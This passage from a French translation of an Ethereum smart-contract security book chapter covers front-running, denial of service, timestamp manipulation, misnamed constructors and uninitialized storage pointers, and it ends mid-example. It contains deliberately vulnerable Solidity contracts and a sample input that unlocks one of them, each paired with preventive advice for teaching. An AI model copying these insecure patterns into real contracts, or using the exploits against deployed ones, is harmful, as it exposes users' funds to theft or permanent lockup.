<h4 id="_techniques_préventives_10">Techniques préventives</h4>
<div class="paragraph">
<p>Il existe deux classes d&#8217;acteurs qui peuvent effectuer ce type d&#8217;attaques de devancement: les utilisateurs (qui modifient la valeur du <code>gasPrice</code> de leurs transactions) et les mineurs eux-mêmes (qui peuvent réorganiser les transactions dans un bloc comme ils l&#8217;entendent). Un contrat vulnérable à la première classe (utilisateurs) est nettement moins bien loti qu&#8217;un contrat vulnérable à la seconde (mineurs), car les mineurs ne peuvent effectuer l&#8217;attaque que lorsqu&#8217;ils résolvent un bloc, ce qui est peu probable pour un mineur individuel ciblant un bloc spécifique. Nous énumérerons ici quelques mesures d&#8217;atténuation relatives aux deux classes d&#8217;attaquants.</p>
</div>
<div class="paragraph">
<p>Une méthode consiste à placer une limite supérieure sur le <code>gasPrice</code>. Cela empêche les utilisateurs d&#8217;augmenter le <code>gasPrice</code> et d&#8217;obtenir un ordre de transaction préférentiel au-delà de la limite supérieure. Cette mesure protège uniquement contre la première classe d&#8217;attaquants (utilisateurs arbitraires). Les mineurs dans ce scénario peuvent toujours attaquer le contrat, car ils peuvent commander les transactions dans leur bloc comme ils le souhaitent, quel que soit le prix du gaz.</p>
</div>
<div class="paragraph">
<p>Une méthode plus robuste consiste à utiliser un schéma de <a href="http://bit.ly/2CUh2KS">validation-révélation</a>. Un tel système dicte que les utilisateurs envoient des transactions avec des informations cachées (généralement un hachage). Une fois la transaction incluse dans un bloc, l&#8217;utilisateur envoie une transaction révélant les données qui ont été envoyées (la phase de révélation). Cette méthode empêche les mineurs et les utilisateurs d&#8217;exécuter des transactions en amont, car ils ne peuvent pas déterminer le contenu de la transaction. Cette méthode, cependant, ne peut pas dissimuler la valeur de la transaction (qui, dans certains cas, est l&#8217;information précieuse qui doit être cachée). Le contrat intelligent <a href="https://ens.domains/">ENS</a> permettait aux utilisateurs d&#8217;envoyer des transactions dont les données engagées comprenaient la quantité d&#8217;ether qu&#8217;ils étaient prêts à dépenser. Les utilisateurs pourraient alors envoyer des transactions de valeur arbitraire. Au cours de la phase de révélation, les utilisateurs ont été remboursés de la différence entre le montant envoyé lors de la transaction et le montant qu&#8217;ils étaient prêts à dépenser.</p>
</div>
<div class="paragraph">
<p>Une autre suggestion de Lorenz Breidenbach, Phil Daian , Ari Juels et Florian Tramèr est d&#8217;utiliser des <a href="http://bit.ly/2SygqQx">"envois sous-marins"</a>. Une implémentation efficace de cette idée nécessite l' opcode <code>CREATE2</code>, qui n&#8217;a actuellement pas été adopté mais semble susceptible de l&#8217;être dans les embranchements à venir.</p>
</div>
</div>
<div class="sect3">
<h4 id="_exemples_concrets_erc20_et_bancor">Exemples concrets : ERC20 et Bancor</h4>
<div class="paragraph">
<p>La <a href="http://bit.ly/2CUf7WG">norme ERC20</a> est assez connue pour la construction de jetons sur Ethereum. Cette norme présente une vulnérabilité de devancement potentielle due à la fonction d&#8217;approbation <code>approve</code>. <a href="http://bit.ly/2DbvQpJ">Mikhail Vladimirov et Dmitry Khovratovich</a> ont écrit une bonne explication de cette vulnérabilité (et des moyens d&#8217;atténuer l&#8217;attaque).</p>
</div>
<div class="paragraph">
<p>La norme spécifie la fonction d' approbation <code>approve</code> comme suit :</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">function approve(address _spender, uint256 _value) returns (bool success)</code></pre>
</div>
</div>
<div class="paragraph">
<p>Cette fonction permet à un utilisateur d&#8217;autoriser d&#8217;autres utilisateurs à transférer des jetons en son nom. La vulnérabilité de devancement se produit dans le scénario où une utilisatrice Alice <em>autorise</em> son ami Bob à dépenser 100 jetons. Alice décide plus tard qu&#8217;elle veut révoquer l&#8217;autorisation de Bob de dépenser, disons, 100 jetons, alors elle crée une transaction qui fixe l&#8217;allocation de Bob à 50 jetons. Bob, qui a observé attentivement la chaîne, voit cette transaction et construit sa propre transaction en dépensant les 100 jetons. Il met un <code>gasPrice</code> plus élevé sur sa transaction que celle d&#8217;Alice, donc sa transaction est prioritaire sur la sienne. Certaines implémentations d' approbation <code>approve</code> permettraient à Bob de transférer ses 100 jetons, puis, lorsque la transaction d&#8217;Alice est validée, réinitialiserait l&#8217;approbation de Bob à 50 jetons, donnant ainsi à Bob l&#8217;accès à 150 jetons.</p>
</div>
<div class="paragraph">
<p><a href="https://www.bancor.network/">Bancor</a> est un autre exemple important dans le monde réel. Ivan Bogatyy et son équipe ont documenté une attaque rentable sur la mise en œuvre initiale de Bancor. Son <a href="http://bit.ly/2EUlLzb">article de blog</a> et <a href="http://bit.ly/2yHgkhs">sa conférence DevCon3 expliquent</a> en détail comment cela a été fait. Essentiellement, les prix des jetons sont déterminés en fonction de la valeur de la transaction ; les utilisateurs peuvent surveiller le bassin de transactions pour les transactions Bancor et les exécuter en amont pour profiter des différences de prix. Cette attaque a été traitée par l&#8217;équipe de Bancor.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_déni_de_service_dos">Déni de service (DoS)</h3>
<div class="paragraph">
<p>Cette catégorie est très large, mais se compose essentiellement d&#8217;attaques où les utilisateurs peuvent rendre un contrat inopérant pendant une période de temps, ou dans certains cas de façon permanente. Cela peut piéger l&#8217;ether dans ces contrats pour toujours, comme ce fut le cas dans <a href="#multisig_secondhack">Exemple concret : Parity Multisig Wallet (Second Hack)</a>.</p>
</div>
<div class="sect3 notoc">
<h4 id="_la_vulnérabilité_11">La vulnérabilité</h4>
<div class="paragraph">
<p>Un contrat peut devenir inopérant de différentes manières. Ici, nous mettons en évidence quelques modèles de codage Solidity moins évidents qui peuvent conduire à des vulnérabilités DoS :</p>
</div>
<div class="dlist">
<dl>
<dt class="hdlist1">Boucle à travers des mappages ou des tableaux manipulés en externe</dt>
<dd>
<p>Ce modèle apparaît généralement lorsqu&#8217;un propriétaire souhaite distribuer des jetons aux investisseurs avec une fonction de type distribution <code>distribute</code>, comme dans cet exemple de contrat :</p>
</dd>
</dl>
</div>
<div class="exampleblock">
<div class="content">
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">contract DistributeTokens {
    address public owner; // est défini ailleurs
    address[] investors; // tableau d'investisseurs
    uint[] investorTokens; // quantité de jeton que reçoivent les investisseurs

    // ... fonctionnalité supplémentaire, y compris transfertoken()

    function invest() external payable {
        investors.push(msg.sender);
        investorTokens.push(msg.value * 5); // 5 fois de wei envoyé
        }

    function distribute() public {
        require(msg.sender == owner); // seulement le propriétaire
        for(uint i = 0; i &lt; investors.length; i++) {
            // ici transferToken(to,amount) transfère le "montant" de
            // jetons à l'adresse "to"
            transferToken(investors[i],investorTokens[i]);
        }
    }
}</code></pre>
</div>
</div>
</div>
</div>
<div class="paragraph">
<p>Notez que la boucle de ce contrat s&#8217;exécute sur un tableau qui peut être gonflé artificiellement. Un attaquant peut créer de nombreux comptes d&#8217;utilisateurs, ce qui agrandit le tableau des investisseurs <code>investor</code>. En principe, cela peut être fait de telle sorte que le gaz requis pour exécuter la boucle for dépasse la limite de gaz du bloc, rendant essentiellement la fonction de distribution <code>distribute</code> inopérante.</p>
</div>
<div class="dlist">
<dl>
<dt class="hdlist1">Opérations du propriétaire</dt>
<dd>
<p>Un autre modèle courant est celui où les propriétaires ont des privilèges spécifiques dans les contrats et doivent effectuer certaines tâches pour que le contrat passe à l&#8217;état suivant. Un exemple serait un contrat d&#8217;offre initiale de pièces (ICO) qui oblige le propriétaire à finaliser (<code>finalize</code>) le contrat, ce qui permet ensuite aux jetons d&#8217;être transférables. Par example:</p>
</dd>
</dl>
</div>
<div class="exampleblock">
<div class="content">
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">bool public isFinalized = false;
address public owner; // est défini quelque part

function finalize() public {
    require(msg.sender == owner);
    isFinalized == true;
}

// ... fonctionnalité ICO supplémentaire

// fonction de transfert surchargée
function transfer(address _to, uint _value) returns (bool) {
    require(isFinalized);
    super.transfer(_to,_value)
}

...</code></pre>
</div>
</div>
</div>
</div>
<div class="paragraph">
<p>Dans de tels cas, si l&#8217;utilisateur privilégié perd ses clés privées ou devient inactif, l&#8217;ensemble du contrat de jeton devient inopérant. Dans ce cas, si le propriétaire ne peut pas appeler <span class="keep-together"><code>finalize</code></span>, aucun jeton ne peut être transféré ; l&#8217;ensemble du fonctionnement de l&#8217;écosystème de jetons repose sur une seule adresse.</p>
</div>
<div class="dlist">
<dl>
<dt class="hdlist1">État de progression basé sur les appels externes</dt>
<dd>
<p>Les contrats sont parfois rédigés de telle sorte que la progression vers un nouvel état nécessite l&#8217;envoi d&#8217;ether à une adresse ou l&#8217;attente d&#8217;une entrée d&#8217;une source externe. Ces modèles peuvent conduire à des attaques DoS lorsque l&#8217;appel externe échoue ou est empêché pour des raisons externes. Dans l&#8217;exemple de l&#8217;envoi d&#8217;ether, un utilisateur peut créer un contrat qui n&#8217;accepte pas l&#8217;ether. Si un contrat exige que l&#8217;ether soit retiré afin de passer à un nouvel état (considérez un contrat à verrouillage temporel qui exige que tout l&#8217;ether soit retiré avant d&#8217;être à nouveau utilisable), le contrat n&#8217;atteindra jamais le nouvel état, car l&#8217;ether ne peut jamais être envoyé au contrat de l&#8217;utilisateur qui n&#8217;accepte pas l&#8217;ether.</p>
</dd>
</dl>
</div>
</div>
<div class="sect3 notoc">
<h4 id="_techniques_préventives_11">Techniques préventives</h4>
<div class="paragraph">
<p>Dans le premier exemple, les contrats ne doivent pas boucler sur des structures de données pouvant être artificiellement manipulées par des utilisateurs externes. Un modèle de retrait est recommandé, dans lequel chacun des investisseurs appelle une fonction de retrait pour réclamer des jetons de manière indépendante.</p>
</div>
<div class="paragraph">
<p>Dans le deuxième exemple, un utilisateur privilégié devait modifier l&#8217;état du contrat. Dans de tels exemples, une sécurité intégrée peut être utilisée dans le cas où le propriétaire deviendrait incapable. Une solution consiste à faire du propriétaire un contrat multisig. Une autre solution consiste à utiliser un verrouillage temporel: dans l&#8217;exemple donné, le require à la ligne 5 pourrait inclure un mécanisme basé sur le temps, tel que <code>require(msg.sender == owner || now &gt; unlockTime)</code> , qui permet à tout utilisateur de finaliser après une période de temps spécifiée par <code>unlockTime</code>. Ce type de technique d&#8217;atténuation peut également être utilisé dans le troisième exemple. Si les appels externes doivent progresser vers un nouvel état, tenez compte de leur échec possible et ajoutez éventuellement une progression d&#8217;état basée sur le temps dans le cas où l&#8217;appel souhaité n&#8217;arrive jamais.</p>
</div>
<div class="admonitionblock note">
<table>
<tr>
<td class="icon">
<div class="title">Note</div>
</td>
<td class="content">
<div class="paragraph">
<p>Bien sûr, il existe des alternatives centralisées à ces suggestions : on peut ajouter un <code>maintenanceUser</code> qui peut intervenir et résoudre les problèmes avec les vecteurs d&#8217;attaque basés sur DoS si besoin est. Généralement, ces types de contrats posent des problèmes de confiance, en raison du pouvoir d&#8217;une telle entité.</p>
</div>
</td>
</tr>
</table>
</div>
</div>
<div class="sect3">
<h4 id="_exemples_concrets_gouvernmental">Exemples concrets : GouvernMental</h4>
<div class="paragraph">
<p><a href="http://governmental.github.io/GovernMental/">GovernMental</a> était un ancien schéma de Ponzi qui accumulait une assez grande quantité d&#8217;ether (1 100 ether, à un moment donné). Malheureusement, il était sensible aux vulnérabilités DoS mentionnées dans cette section. Un <a href="http://bit.ly/2DcgvFc">post Reddit</a> par etherik décrit comment le contrat exigeait la suppression d&#8217;un grand mappage afin de retirer l&#8217;ether. La suppression de cette cartographie avait un coût en gaz qui dépassait la limite de gaz du bloc à l&#8217;époque, et il n&#8217;était donc pas possible de retirer les 1 100 ethers . L&#8217;adresse du contrat est <a href="http://bit.ly/2Oh8j7R">0xF45717552f12Ef7cb65e95476F217Ea008167Ae3</a>, et vous pouvez voir dans la transaction <a href="http://bit.ly/2Ogzrnn">0x0d80d67202bd9cb6773df8dd2020e719&thinsp;0a1b0793e8ec4fc105257e8128f0506b</a> que les 1 100 ether ont finalement été obtenus via 2.5M en frais de gaz (et ce quand la limite du gaz fût augmenté).</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_blocage_de_la_manipulation_de_lhorodatage">Blocage de la manipulation de l&#8217;horodatage</h3>
<div class="paragraph">
<p>Les horodatages de bloc ont historiquement été utilisés pour une variété d&#8217;applications, telles que l&#8217;entropie pour les nombres aléatoires (voir l'<a href="#entropyillusion_security">Illusion d&#8217;entropie</a> pour plus de détails), le verrouillage des fonds pendant des périodes de temps et diverses instructions conditionnelles de changement d&#8217;état qui dépendent du temps. Les mineurs ont la possibilité d' ajuster légèrement les horodatages, ce qui peut s&#8217;avérer dangereux si les horodatages de bloc sont utilisés de manière incorrecte dans les contrats intelligents.</p>
</div>
<div class="paragraph">
<p>Les références utiles pour cela incluent <a href="http://bit.ly/2OdUC9C">la documentation Solidity</a> et <a href="http://bit.ly/2CQ8gh4">la question Ethereum sur Stack Exchange de Joris Bontje</a> sur le sujet.</p>
</div>
<div class="sect3 notoc">
<h4 id="_la_vulnérabilité_12">La vulnérabilité</h4>
<div class="paragraph">
<p><code>block.timestamp</code> et son alias <code>now</code> peuvent désormais être manipulés par les mineurs s&#8217;ils sont incités à le faire. Construisons un jeu simple, montré dans <a href="#roulette_security">roulette.sol</a>, qui serait vulnérable à l&#8217;exploitation des mineurs.</p>
</div>
<div id="roulette_security" class="exampleblock">
<div class="title">Example 11. roulette.sol</div>
<div class="content">
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">contract Roulette {
    uint public pastBlockTime; // force un pari par bloc

    constructor() external payable {} // initialise le financement du contrat

    // fonction de repli utilisée pour faire un pari
    function () external payable {
        require(msg.value == 10 ether); // doit envoyer 10 ether pour jouer
        require(now != pastBlockTime); // seulement 1 transaction par bloc
        pastBlockTime = now;
        if(now % 15 == 0) { // gagnant
            msg.sender.transfer(this.balance);
        }
    }
}</code></pre>
</div>
</div>
</div>
</div>
<div class="paragraph">
<p>Ce contrat se comporte comme une simple loterie. Une transaction par bloc peut parier 10 ethers pour avoir une chance de gagner le solde du contrat. L&#8217;hypothèse ici est que les deux derniers chiffres de <code>block.timestamp</code> sont uniformément distribués. Si tel était le cas, il y aurait 1 chance sur 15 de gagner à cette loterie.</p>
</div>
<div class="paragraph">
<p>Cependant, comme nous le savons, les mineurs peuvent ajuster l&#8217;horodatage s&#8217;ils en ont besoin. Dans ce cas particulier, s&#8217;il y a suffisamment d&#8217;ether dans le contrat, un mineur qui résout un bloc est incité à choisir un horodatage tel que <code>block.timestamp</code> ou <code>now</code> modulo 15 est <code>0</code>. Ce faisant, ils peuvent gagner l&#8217;ether verrouillé dans ce contrat avec la récompense globale. Comme il n&#8217;y a qu&#8217;une seule personne autorisée à parier par bloc, cela est également vulnérable aux attaques de dépassement (voir <a href="#frontrunning_security">Conditions de course/devancement</a> pour plus de détails).</p>
</div>
<div class="paragraph">
<p>En pratique, les horodatages de bloc augmentent de manière monotone et les mineurs ne peuvent donc pas choisir des horodatages de bloc arbitraires (ils doivent être postérieurs à leurs prédécesseurs). Ils sont également limités à définir des heures de bloc pas trop éloignées dans le futur, car ces blocs seront probablement rejetés par le réseau (les nœuds ne valideront pas les blocs dont les horodatages sont dans le futur).</p>
</div>
</div>
<div class="sect3 notoc">
<h4 id="_techniques_préventives_12">Techniques préventives</h4>
<div class="paragraph">
<p>Les horodatages de bloc ne doivent pas être utilisés pour l&#8217;entropie ou la génération de nombres aléatoires, c&#8217;est-à-dire qu&#8217;ils ne doivent pas être le facteur décisif (directement ou par dérivation) pour gagner un jeu ou changer un état important.</p>
</div>
<div class="paragraph">
<p>Une logique sensible au temps est parfois nécessaire ; par exemple, pour débloquer des contrats (verrou temporel), remplir une ICO après quelques semaines ou faire respecter des dates d&#8217;expiration. Il est parfois recommandé d&#8217;utiliser <a href="http://bit.ly/2OdUC9C"><code>block.number</code></a> et un temps de bloc moyen pour estimer les temps; avec un temps de bloc de <code>10 secondes</code>, <code>1 semaine</code> équivaut à environ <code>60 480 blocs</code>. Ainsi, spécifier un numéro de bloc auquel changer un état de contrat peut être plus sûr, car les mineurs sont incapables de manipuler facilement le numéro de bloc. Le contrat <a href="http://bit.ly/2AAebFr">BAT ICO</a> a employé cette stratégie.</p>
</div>
<div class="paragraph">
<p>Cela peut être inutile si les contrats ne sont pas particulièrement concernés par les manipulations des mineurs de l&#8217;horodatage du bloc, mais c&#8217;est quelque chose dont il faut être conscient lors de l&#8217;élaboration des contrats.</p>
</div>
</div>
<div class="sect3">
<h4 id="_exemple_concret_governmental">Exemple concret : GovernMental</h4>
<div class="paragraph">
<p><a href="http://governmental.github.io/GovernMental/">GovernMental</a>, l&#8217;ancien schéma de Ponzi mentionné ci-dessus, était également vulnérable à une attaque basée sur l&#8217;horodatage. Le contrat est payé au joueur qui a été le dernier joueur à rejoindre (pendant au moins une minute) un tour. Ainsi, un mineur qui était un joueur pouvait ajuster l&#8217;horodatage (à une heure future, pour donner l&#8217;impression qu&#8217;une minute s&#8217;était écoulée) pour faire apparaître qu&#8217;il était le dernier joueur à rejoindre pendant plus d&#8217;une minute (même si ce n&#8217;était pas vrai dans la réalité). Plus de détails à ce sujet peuvent être trouvés dans le <a href="http://bit.ly/2Q1AMA6">post "Historique des vulnérabilités de sécurité d&#8217;Ethereum, des piratages et de leurs correctifs"</a> par Tanya <span class="keep-together">Bahrynovska</span>.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_constructeurs_avec_soin">Constructeurs avec soin</h3>
<div class="paragraph">
<p>Les constructeurs sont des fonctions spéciales qui effectuent souvent des tâches critiques et privilégiées lors de l&#8217;initialisation des contrats. Avant Solidity v0.4.22, les constructeurs étaient définis comme des fonctions portant le même nom que le contrat qui les contenait. Dans de tels cas, lorsque le nom du contrat est modifié au cours du développement, si le nom du constructeur n&#8217;est pas également modifié, il devient une fonction appelable normale. Comme vous pouvez l&#8217;imaginer, cela peut conduire (et a conduit) à des hacks de contrats intéressants.</p>
</div>
<div class="paragraph">
<p>Pour plus d&#8217;informations, le lecteur peut être intéressé à tenter les <a href="https://github.com/OpenZeppelin/ethernaut">défis Ethernaut</a> (en particulier le niveau Fallout).</p>
</div>
<div class="sect3 notoc">
<h4 id="_la_vulnérabilité_13">La vulnérabilité</h4>
<div class="paragraph">
<p>Si le nom du contrat est modifié, ou s&#8217;il y a une faute de frappe dans le nom du constructeur qui ne correspond pas au nom du contrat, le constructeur se comportera comme une fonction normale. Cela peut avoir des conséquences désastreuses, surtout si le constructeur effectue des opérations privilégiées. Considérez le contrat suivant :</p>
</div>
<div class="exampleblock">
<div class="content">
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">contract OwnerWallet {
    address public owner;
    // constructeur
    function ownerWallet(address _owner) public {
        owner = _owner;
    }

    // Par défaut. Récupérer de l'ether.
    function () payable {}

    function withdraw() public {
        require(msg.sender == owner);
        msg.sender.transfer(this.balance);
    }
}</code></pre>
</div>
</div>
</div>
</div>
<div class="paragraph">
<p>Ce contrat collecte de l&#8217;ether et permet uniquement au propriétaire de le retirer, en appelant la fonction de retrait <code>withdraw</code>. Le problème se pose car le constructeur ne porte pas exactement le même nom que le contrat : la première lettre est différente ! Ainsi, n&#8217;importe quel utilisateur peut appeler la fonction <code>ownerWallet</code>, se définir comme propriétaire, puis prendre tout l&#8217;ether du contrat en appelant <code>withdraw</code>.</p>
</div>
</div>
<div class="sect3 notoc">
<h4 id="_techniques_préventives_13">Techniques préventives</h4>
<div class="paragraph">
<p>Ce problème a été résolu dans la version 0.4.22 du compilateur Solidity. Cette version a introduit un mot clé <code>constructor</code> qui spécifie le constructeur, plutôt que d&#8217;exiger que le nom de la fonction corresponde au nom du contrat. L&#8217;utilisation de ce mot-clé pour spécifier les constructeurs est recommandée pour éviter les problèmes de nommage.</p>
</div>
</div>
<div class="sect3">
<h4 id="_exemple_concret_rubixi">Exemple concret : Rubixi</h4>
<div class="paragraph">
<p><a href="http://bit.ly/2ESWG7t">Rubixi</a> était un autre système pyramidal qui présentait ce type de vulnérabilité. Il s&#8217;appelait à l&#8217;origine <code>DynamicPyramid</code> , mais le nom du contrat a été modifié avant le déploiement sur <code>Rubixi</code>. Le nom du constructeur n&#8217;a pas été modifié, permettant à n&#8217;importe quel utilisateur de devenir le créateur. Des discussions intéressantes liées à ce bogue peuvent être trouvées sur <a href="http://bit.ly/2P0TRWw">Bitcointalk</a>. En fin de compte, cela a permis aux utilisateurs de se battre pour le statut de créateur afin de réclamer les frais du système pyramidal. Plus de détails sur ce bogue particulier peuvent être trouvés dans <a href="http://bit.ly/2Q1AMA6">"Historique des vulnérabilités de sécurité d&#8217;Ethereum, des piratages et de leurs correctifs"</a>.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_pointeurs_de_stockage_non_initialisés">Pointeurs de stockage non initialisés</h3>
<div class="paragraph">
<p>L&#8217;EVM stocke les données sous forme de stockage (disque, par exemple) ou de mémoire. Il est fortement recommandé de comprendre exactement comment cela se fait et les types par défaut des variables locales des fonctions lors du développement de contrats. En effet, il est possible de produire des contrats vulnérables en initialisant de manière inappropriée des variables.</p>
</div>
<div class="paragraph">
<p>Pour en savoir plus sur le stockage et la mémoire dans l&#8217;EVM, consultez la documentation de Solidity sur <a href="http://bit.ly/2OdUU0l">l&#8217;emplacement des données</a> , la <a href="http://bit.ly/2JslDWf">disposition des variables d&#8217;état dans le stockage</a> et <a href="http://bit.ly/2Dch2Hc">la disposition dans la mémoire</a>.</p>
</div>
<div class="admonitionblock note">
<table>
<tr>
<td class="icon">
<div class="title">Note</div>
</td>
<td class="content">
<div class="paragraph">
<p>Cette section est basée sur un excellent <a href="http://bit.ly/2ERI0pb">article de Stefan Beyer</a>. D&#8217;autres lectures sur ce sujet, inspirées par Stefan, peuvent être trouvées dans ce <a href="http://bit.ly/2OgxPtG">fil Reddit</a>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="sect3 notoc">
<h4 id="_la_vulnérabilité_14">La vulnérabilité</h4>
<div class="paragraph">
<p>Les variables locales dans les fonctions sont par défaut le stockage ou la mémoire en fonction de leur type. Les variables de stockage local non initialisées peuvent contenir la valeur d&#8217;autres variables de stockage dans le contrat ; ce fait peut provoquer des vulnérabilités involontaires ou être exploité délibérément.</p>
</div>
<div class="paragraph">
<p>Considérons le contrat de bureau d&#8217;enregistrement de noms relativement simple dans <a href="#nameregistrar_security">NameRegistrar.sol</a>.</p>
</div>
<div id="nameregistrar_security" class="exampleblock">
<div class="title">Example 12. NameRegistrar.sol</div>
<div class="content">
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">// Un bureau d'enregistrement de noms verrouillé
contract NameRegistrar {

    bool public unlocked = false;  // bureau d'enregistrement verrouillé, pas de mises à jour de nom

    struct NameRecord { // mappe les hachages aux adresses
        bytes32 name;
        address mappedAddress;
    }

    // enregistre les noms
    mapping(address =&gt; NameRecord) public registeredNameRecord;
    // résout les hachages en adresses
    mapping(bytes32 =&gt; address) public resolve;

    function register(bytes32 _name, address _mappedAddress) public {
        // configure le nouveau NameRecord
        NameRecord newRecord;
        newRecord.name = _name;
        newRecord.mappedAddress = _mappedAddress;

        resolve[_name] = _mappedAddress;
        registeredNameRecord[msg.sender] = newRecord;

        require(unlocked); // n'autorise les inscriptions que si le contrat est déverrouillé
    }
}</code></pre>
</div>
</div>
</div>
</div>
<div class="paragraph">
<p>Ce simple registraire de noms n&#8217;a qu&#8217;une seule fonction. Lorsque le contrat est <code>unlocked</code> (déverrouillé), il permet à quiconque d&#8217;enregistrer un nom (sous forme de hachage <code>bytes32</code>) et de mapper ce nom à une adresse. Le bureau d&#8217;enregistrement est initialement verrouillé et l' exigence <code>require</code> à la ligne 25 empêche le registre d&#8217;ajouter des enregistrements de nom avec <code>register</code>. Il semble que le contrat soit inutilisable, car il n&#8217;y a aucun moyen de déverrouiller le registre ! Il existe cependant une vulnérabilité qui permet l&#8217;enregistrement du nom quelle que soit la variable <code>unlocked</code>.</p>
</div>
<div class="paragraph">
<p>Pour discuter de cette vulnérabilité, nous devons d&#8217;abord comprendre comment fonctionne le stockage dans Solidity. En tant qu&#8217;aperçu de haut niveau (sans aucun détail technique approprié - nous vous suggérons de lire les documents Solidity pour un examen approprié), les variables d&#8217;état sont stockées séquentiellement dans les <em>emplacements</em> (ou <em>slots</em>) tels qu&#8217;ils apparaissent dans le contrat (ils peuvent être regroupés mais ne sont pas dans ce exemple, donc nous ne nous en préoccuperons pas). Ainsi, <code>unlocked</code> existe dans <code>slot[0]</code>, <code>registerNameRecord</code> dans <code>slot[1]</code> , et <code>resolve</code> dans <code>slot[2]</code>, etc. Chacun de ces emplacements a une taille de 32 octets (il y a des complexités supplémentaires avec les mappages, que nous ignorerons pour à présent). Le booléen <code>unlocked</code> ressemblera à <code>0x000&#8230;&#8203;0</code> (64 0s, à l&#8217;exclusion du <code>0x</code>) pour <code>false</code> ou <code>0x000&#8230;&#8203;1</code> (63 0s) pour <code>true</code>. Comme vous pouvez le voir, il y a un important gaspillage de stockage dans cet exemple particulier .</p>
</div>
<div class="paragraph">
<p>La pièce suivante du puzzle est que Solidity place par défaut des types de données complexes, tels que des structures structs, en stockage lors de leur initialisation en tant que variables locales. Par conséquent, <span class="keep-together"><code>newRecord</code></span> à la ligne 18 utilise par défaut le stockage. La vulnérabilité est causée par le fait que <span class="keep-together"><code>newRecord</code></span> n&#8217;est pas initialisé. Comme il s&#8217;agit par défaut du stockage, il est mappé sur l&#8217;emplacement de stockage <code>slot[0]</code>,qui contient actuellement un pointeur vers <code>unlocked</code>. Notez qu&#8217;aux lignes 19 et 20, nous définissons ensuite <code>newRecord.name</code> sur <code>_name</code> et <code>newRecord.mappedAddress</code> sur <span class="keep-together"><code>_mappedAddress</code></span>; cela met à jour les emplacements de stockage de slot[0] et <code>slot[1]</code>,ce qui modifie à la fois <code>unlocked</code> et l&#8217;emplacement de stockage associé à <code>registerNameRecord</code>.</p>
</div>
<div class="paragraph">
<p>Cela signifie que <code>unlocked</code> peut être modifié directement, simplement par le paramètre <code>bytes32 _name</code> de la fonction <code>register</code>. Par conséquent, si le dernier octet de <code>_name</code> est différent de zéro, il modifiera le dernier octet de storage <code>slot[0]</code> et changera directement <code>unlocked</code> en true . De telles valeurs <code>_name</code> entraîneront la réussite de l&#8217;appel <code>require</code> sur la ligne 25, car nous avons défini <code>unlocked</code> sur true . Essayez ceci dans Remix. Notez que la fonction passera si vous utilisez un <code>_name</code> du formulaire :</p>
</div>
<div class="listingblock">
<div class="content">
<pre>0x0000000000000000000000000000000000000000000000000000000000000001</pre>
</div>
</div>
</div>
<div class="sect3 notoc">
<h4 id="_techniques_préventives_14">Techniques préventives</h4>
<div class="paragraph">
<p>Solidity affiche un avertissement pour les variables de stockage non initialisées ; les développeurs doivent prêter une attention particulière à ces avertissements lors de la création de contrats intelligents. La version actuelle de Mist (0.10) ne permet pas de compiler ces contrats. Il est souvent recommandé d&#8217;utiliser explicitement les spécificateurs de mémoire <code>memory</code> ou de stockage <code>storage</code> lorsqu&#8217;il s&#8217;agit de types complexes, pour s&#8217;assurer qu&#8217;ils se comportent comme prévu.</p>
</div>
</div>
<div class="sect3">
<h4 id="_exemples_concrets_pots_de_miel_openaddresslottery_et_cryptoroulette">Exemples concrets : Pots de miel OpenAddressLottery et CryptoRoulette</h4>
<div class="paragraph">
<p>Un pot de miel nommé <a href="http://bit.ly/2AAVnWD"><code>OpenAddressLottery</code></a>a été déployé qui a utilisé cette bizarrerie de variable de stockage non initialisée pour collecter de l&#8217;ether auprès de certains pirates potentiels. Le contrat est plutôt impliqué, nous laisserons donc l&#8217;analyse au <a href="http://bit.ly/2OgxPtG">fil Reddit</a> où l&#8217;attaque est assez clairement expliquée.</p>
</div>
<div class="paragraph">
<p>Un autre pot de miel, <a href="http://bit.ly/2OfNGJ2">CryptoRoulette</a>, a également utilisé cette astuce pour essayer de collecter de l&#8217;ether. Si vous ne pouvez pas comprendre comment fonctionne l&#8217;attaque, consultez <a href="http://bit.ly/2OVkSL4">« Une analyse de quelques contrats de pot de miel Ethereum »</a> pour un aperçu de ce contrat et d&#8217;autres.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_virgule_flottante_et_de_précision">Virgule flottante et de précision</h3>
<div class="paragraph">
<p>Au moment d&#8217;écrire ces lignes (v0.4.24), Solidity ne prend pas en charge les nombres à virgule fixe et à virgule flottante. Cela signifie que les représentations en virgule flottante doivent être construites avec des types entiers dans Solidity. Cela peut entraîner des erreurs et des vulnérabilités s&#8217;il n&#8217;est pas mis en œuvre correctement.</p>
</div>
<div class="admonitionblock note">
<table>
<tr>
<td class="icon">
<div class="title">Note</div>
</td>
<td class="content">
<div class="paragraph">
<p>Pour en savoir plus, consultez le <a href="http://bit.ly/2Ogp2Ia">wiki Ethereum Contract Security Techniques and Tips</a>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="sect3 notoc">
<h4 id="_la_vulnérabilité_15">La vulnérabilité</h4>
<div class="paragraph">
<p>Comme il n&#8217;y a pas de type à virgule fixe dans Solidity, les développeurs doivent implémenter le leur en utilisant les types de données entiers standard. Il existe un certain nombre de pièges que les développeurs peuvent rencontrer au cours de ce processus. Nous allons essayer d&#8217;en souligner quelques-uns dans cette section.</p>
</div>
<div class="paragraph">
<p>Commençons par un exemple de code (nous ignorerons les problèmes de soupassement/dépassement, abordés plus haut dans ce chapitre, pour plus de simplicité) :</p>
</div>
<div class="exampleblock">
<div class="content">
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-solidity" data-lang="solidity">contract FunWithNumbers {
    uint constant public tokensPerEth = 10;
    uint constant public weiPerEth = 1e18;
    mapping(address =&gt; uint) public balances;

    function buyTokens() external payable {
